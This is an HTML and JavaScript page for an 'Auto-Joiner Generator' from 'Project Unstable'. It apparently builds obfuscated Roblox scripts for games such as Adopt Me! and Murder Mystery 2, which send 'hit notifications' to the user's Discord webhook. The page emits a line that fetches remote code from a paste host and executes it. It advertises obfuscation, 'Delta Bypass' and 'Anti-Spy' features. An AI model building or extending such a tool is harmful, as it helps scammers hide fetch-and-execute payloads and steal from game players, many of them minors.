<!DOCTYPE html>
<html>
<head>
    <title>Auto-Joiner Generator | Project Unstable</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 800px; margin: 0 auto; }
        .card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 32px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 {
            font-size: 28px;
            background: linear-gradient(135deg, #fff 0%, #a855f7 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }
        .sub { color: #888; margin-bottom: 32px; font-size: 14px; }
        label { color: #ccc; font-size: 14px; font-weight: 500; display: block; margin-bottom: 8px; }
        input, select {
            width: 100%;
            padding: 14px 16px;
            background: rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: white;
            font-size: 14px;
            margin-bottom: 20px;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #a855f7;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
            border: none;
            border-radius: 12px;
            color: white;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
        }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .result {
            margin-top: 32px;
            background: #0a0a0a;
            border-radius: 16px;
            padding: 20px;
        }
        .loadstring {
            background: #000;
            padding: 16px;
            border-radius: 12px;
            font-family: monospace;
            font-size: 12px;
            color: #4ade80;
            word-break: break-all;
            margin-bottom: 16px;
            max-height: 200px;
            overflow: auto;
        }
        .copy-btn {
            background: #2a2a3e;
            padding: 10px;
            margin-top: 0;
        }
        .status {
            padding: 12px;
            border-radius: 12px;
            margin-top: 16px;
            font-size: 13px;
        }
        .status.loading { background: rgba(168,85,247,0.2); color: #a855f7; }
        .status.success { background: rgba(74,222,128,0.2); color: #4ade80; }
        .status.error { background: rgba(239,68,68,0.2); color: #ef4444; }
        hr { border-color: rgba(255,255,255,0.1); margin: 20px 0; }
        .feature-badge {
            display: inline-block;
            background: rgba(168,85,247,0.2);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #a855f7;
            margin-right: 8px;
        }
        .info-text {
            font-size: 12px;
            color: #666;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>⚡ Auto-Joiner Generator</h1>
            <div class="sub">Generate an obfuscated loadstring for your Discord webhook</div>
            
            <label>🔑 Your UUID (from Project Unstable)</label>
            <input type="text" id="uuid" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx">
            <div class="info-text">Find this in your Project Unstable dashboard</div>
            
            <label>📡 Discord Webhook URL</label>
            <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/...">
            <div class="info-text">Where you want to receive hit notifications</div>
            
            <label>🎮 Target Game</label>
            <select id="gameId">
                <option value="142823291">Murder Mystery 2 (142823291)</option>
                <option value="2753915549">Blox Fruits (2753915549)</option>
                <option value="3956818381">Adopt Me! (3956818381)</option>
                <option value="6309113114">Tap Simulator (6309113114)</option>
                <option value="6045232503">Grow a Garden (6045232503)</option>
            </select>
            
            <label>⏱️ Check Interval (Seconds)</label>
            <input type="number" id="interval" value="5" min="1" max="30">
            
            <label>🛡️ Obfuscation Level</label>
            <select id="obfLevel">
                <option value="basic">Basic - Name Mangling</option>
                <option value="medium" selected>Medium - Name + String Encoding</option>
                <option value="high">High - Full Obfuscation (Slower)</option>
            </select>
            
            <button id="generateBtn">✨ Generate Obfuscated Loadstring</button>
            
            <div id="result" style="display: none;">
                <div class="result">
                    <div class="result-label">🔗 YOUR LOADSTRING (Click to copy)</div>
                    <div class="loadstring" id="loadstringOutput"></div>
                    <button class="copy-btn" onclick="copyLoadstring()">📋 Copy to Clipboard</button>
                    <div id="statusMsg"></div>
                </div>
            </div>
            
            <hr>
            <div style="font-size: 12px; color: #666; text-align: center;">
                <span class="feature-badge">🔒 Obfuscated</span>
                <span class="feature-badge">📦 Pastefy Hosted</span>
                <span class="feature-badge">🚀 Delta Bypass</span>
                <span class="feature-badge">🛡️ Anti-Spy</span>
            </div>
        </div>
    </div>

    <script>
        async function generateLoadstring() {
            const uuid = document.getElementById('uuid').value;
            const webhook = document.getElementById('webhook').value;
            const gameId = document.getElementById('gameId').value;
            const interval = document.getElementById('interval').value;
            const obfLevel = document.getElementById('obfLevel').value;
            
            if (!uuid || uuid.length < 30) {
                alert('Please enter a valid UUID');
                return;
            }
            
            if (!webhook || !webhook.includes('discord.com/api/webhooks/')) {
                alert('Please enter a valid Discord webhook URL');
                return;
            }
            
            const btn = document.getElementById('generateBtn');
            const resultDiv = document.getElementById('result');
            const statusDiv = document.getElementById('statusMsg');
            
            btn.disabled = true;
            btn.textContent = '🔧 Generating & Obfuscating...';
            resultDiv.style.display = 'block';
            statusDiv.innerHTML = '<div class="status loading glow">⏳ Creating obfuscated script on Pastefy...</div>';
            
            try {
                const response = await fetch('/api/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ uuid, webhook, gameId, interval, obfLevel })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    const loadstringCode = `loadstring(game:HttpGet("${data.rawUrl}"))()`;
                    document.getElementById('loadstringOutput').textContent = loadstringCode;
                    statusDiv.innerHTML = '<div class="status success">✅ Obfuscated script created! Your loadstring is ready.</div>';
                } else {
                    statusDiv.innerHTML = `<div class="status error">❌ Error: ${data.error}</div>`;
                }
            } catch (err) {
                statusDiv.innerHTML = `<div class="status error">❌ Failed: ${err.message}</div>`;
            } finally {
                btn.disabled = false;
                btn.textContent = '✨ Generate Obfuscated Loadstring';
            }
        }
        
        function copyLoadstring() {
            const code = document.getElementById('loadstringOutput').textContent;
            navigator.clipboard.writeText(code);
            const copyBtn = document.querySelector('.copy-btn');
            const originalText = copyBtn.textContent;
            copyBtn.textContent = '✅ Copied!';
            setTimeout(() => { copyBtn.textContent = originalText; }, 2000);
        }
    </script>
</body>
</html>
